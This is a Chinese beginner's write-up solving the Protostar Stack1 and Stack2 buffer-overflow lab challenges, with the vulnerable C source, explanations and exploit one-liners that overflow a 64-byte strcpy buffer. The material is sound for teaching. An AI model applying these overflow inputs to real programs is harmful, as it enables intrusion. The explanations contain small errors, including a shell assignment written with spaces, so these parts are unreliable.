# **搞定Stack1与Stack2挑战**
* * *
前面，我们已经成功搞定了Protostar
Stack0挑战，下面，我们开始处理Stack1和Stack2。实际上，它们的目标与Stack0的目标是一致的，那就是要改变变量的值，不过，在具体的改变变量的方式上，还是有所不同的。
## **Stack1挑战**
* * *
对于这个挑战，相应的代码如下所示：
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char **argv)
    {
     volatile int modified;
     char buffer[64];
     if(argc == 1) {
      errx(1, "please specify an argument\n");
     }
     modified = 0;
     strcpy(buffer, argv[1]);
     if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
     } else {
      printf("Try again, you got 0x%08x\n", modified);
     }
    }
**代码详解**
* * *
下面，我们对这段代码进行详细的解读：
首先，它创建了一个名为“modified”的变量，并为其分配了64个字符的缓冲区。
    volatile int modified; 
    char buffer[64];
然后，检查我们是否为其提供了相应的参数。
    if(argc == 1) {
      errx(1, "please specify an argument\n");
     }
将变量“modified”的值设为0，然后，将argv[1]中的值拷贝到变量“modified”的缓冲区中。
    modified = 0;
    strcpy(buffer, argv[1]);
然后，检查这个变量的值是否为0x61626364。
    if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
     } else {
      printf("Try again, you got 0x%08x\n", modified);
     }
**解决方案**
* * *
因此，这个题目与Stack0题目非常相似，只是需要将变量的值设置为特定值，即0x61626364。实际上，这个值是“dcba”的十六进制的表示形式——需要注意的是，当读取十六进制值时，要从右向左，而不是从左向右读取。为此，我们可以先输入64个字符，然后再输入这个值。好了，下面让我们尝试一下。
首先，让我们运行stack1的代码。
如您所见，它让我们指定一个参数。那么，让我们随便输入一些内容。
我们重复了一次，得到的值还是0x00000000。下面，让我们尝试越过缓冲区来输入任意字符(例如“b”)，看看会发生什么情况。
    ./stack1 `python -c "print ('A' * 64 + 'b')"`
我们看到，该值变成了0x00000062，即“b”的十六进制值，因此，我们的方法是有效的，所以，可以继续应用该方法。
    ./stack1 `python -c "print ('A' * 64 + 'dcba')"`
搞定了！
不过，我们还能用其他方法来达到这一目的吗？实际上，我们也可以使用十六进制值，而不是输入ASCII码，不过，这需要使用Python进行相应的转换。
    ./stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
## **Stack2挑战**
* * *
对于这个挑战，相应的代码如下所示：
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char **argv)
    {
     volatile int modified;
     char buffer[64];
     char *variable;
     variable = getenv("GREENIE");
     if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
     }
     modified = 0;
     strcpy(buffer, variable);
     if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
     } else {
      printf("Try again, you got 0x%08x\n", modified);
     }
    }
**代码详解**
* * *
下面，我们对这段代码进行详细的解读：
首先，它也创建了一个名为“modified”的变量，并为其分配了64个字符的缓冲区。
    volatile int modified;
    char buffer[64];
这里的不同之处在于，新添加了是一个名为“variable”的变量，它的值来自一个名为“greenie”的环境变量。
    variable = getenv("GREENIE");
之后，该程序的代码会检查变量“variable”的值是否为NULL。
    if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
     }
然后，将Modified的值设置为0 。
    modified = 0;
并将变量“variable”的值拷贝到变量“modified”的缓冲区中。
    strcpy(buffer, variable);
然后，检查变量“modified”的值是否为0x0D0A0D0A。
    if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
     } else {
      printf("Try again, you got 0x%08x\n", modified);
     }
**解决方案**
* * *
如上所示，这次我们不能直接给变量指定值，而必须通过环境变量来完成。从某些方面来说，这实际上是一个非常好的例子，因为它展示了创造性地利用漏洞的重要性，毕竟，我们每次都面临的情形不可能如出一辙，所以，必须根据具体问题具体分析。
就本例来说，我们可以应用常规的漏洞利用方法，将该值存放到环境变量“GREENIE”中。
但是等一下，那什么是环境变量呢？
**环境变量**
* * *
简单地说，环境变量也是变量，用来存储系统用到的一些东西的值，此外，服务也可以访问这些变量。为了帮助读者理解这个概念，下面举例说明。
下面，我们来看看环境变量BASH：
我们可以看到，这个环境变量的值是`/bin/bash`。
所以，如果我想运行bash，直接在终端中键入bash命令即可，而不用输入冗长的./bin/bash命令，因为，系统会调用变量BASH，并找到相应的路径。
不过，系统并不会为每个二进制文件都存储一个变量，所以，专门提供了一个叫做PATH的环境变量，其中保存了所有可能含有二进制文件的目录，所以，当我们键入命令，如python时，它会在这些目录中进行搜索，然后运行找到的python。
好了，这样解释的话，大家一定能够理解了。当然，理解环境变量对于这个挑战来说不是必要的，但是，如果能够理解这个概念的话，对大家也是非常有用的。
关于环境变量的更多信息，请参阅[这里](https://en.wikipedia.org/wiki/Environment_variable "这里")。
现在，让我们执行stack2程序。
它提示我们设置环境变量GREENIE。
不过，系统中并没有名为Greenie的环境变量，所以，我们需要自己创建它。之后，给它赋值，具体为：前面是64个字符，后面跟上0x0D0A0D0A。
这一次，我们就不能像Stack1那样来使用ASCII中的值了，因为`0x0d`是一个回车符，即`\r`，而`0x0a`是一个换行符`\n`，所以，我们不能直接键入这些值，而需要使用相应的十六进制值，然后利用Python完成相应的转换工作。
    GREENIE = `python -c "print ('A' * 64 + '\x0a\x0d\x0a\x0d')"`
如图所示，上面只有64个字符A，这是因为看不到回车符和换行符。
现在，我们需要将其导出到环境变量列表中，并再次执行stack2程序。
    export GREENIE
    ./stack2
搞定！
希望本文对初学者能有所帮助，并祝大家阅读愉快！